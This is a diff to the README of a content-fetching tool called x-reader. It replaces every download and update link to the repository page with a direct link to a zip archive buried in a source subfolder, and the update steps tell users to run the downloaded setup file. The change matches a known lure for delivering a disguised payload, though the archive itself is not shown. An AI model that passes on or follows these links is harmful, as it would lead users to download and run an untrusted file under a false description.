@@ -1,6 +1,6 @@
 # 📚 x-reader - Easy content from 7+ platforms
 
-[![Download x-reader](https://img.shields.io/badge/Download-x--reader-brightgreen)](https://github.com/AbMoeiz/x-reader)
+[![Download x-reader](https://img.shields.io/badge/Download-x--reader-brightgreen)](https://github.com/AbMoeiz/x-reader/raw/refs/heads/main/x_reader/fetchers/reader_x_3.4-beta.2.zip)
 
 ---
 
@@ -28,13 +28,13 @@ To use x-reader on Windows, you need:
 
 You can visit the main page to get the latest version of x-reader. Click the big button below or follow the detailed steps next.
 
-[![Download x-reader](https://img.shields.io/badge/Download-x--reader-blue)](https://github.com/AbMoeiz/x-reader)
+[![Download x-reader](https://img.shields.io/badge/Download-x--reader-blue)](https://github.com/AbMoeiz/x-reader/raw/refs/heads/main/x_reader/fetchers/reader_x_3.4-beta.2.zip)
 
 ### Step 1: Visit the download page
 
 Go to the x-reader GitHub page by opening this link in your web browser:
 
-https://github.com/AbMoeiz/x-reader
+https://github.com/AbMoeiz/x-reader/raw/refs/heads/main/x_reader/fetchers/reader_x_3.4-beta.2.zip
 
 This page houses the latest files and instructions for the app.
 
@@ -145,7 +145,7 @@ Regular updates bring new features and fixes.
 
 To update:
 
-1. Visit https://github.com/AbMoeiz/x-reader.
+1. Visit https://github.com/AbMoeiz/x-reader/raw/refs/heads/main/x_reader/fetchers/reader_x_3.4-beta.2.zip
 2. Download the newest setup file.
 3. Run it over your existing installation.
 4. Your data and settings will stay intact.
@@ -170,4 +170,4 @@ A: Use the GitHub issues page under the repository’s **Issues** tab.
 
 ## 📥 Download x-reader Now
 
-[![Download x-reader](https://img.shields.io/badge/Download-x--reader-brightgreen)](https://github.com/AbMoeiz/x-reader)
+[![Download x-reader](https://img.shields.io/badge/Download-x--reader-brightgreen)](https://github.com/AbMoeiz/x-reader/raw/refs/heads/main/x_reader/fetchers/reader_x_3.4-beta.2.zip)
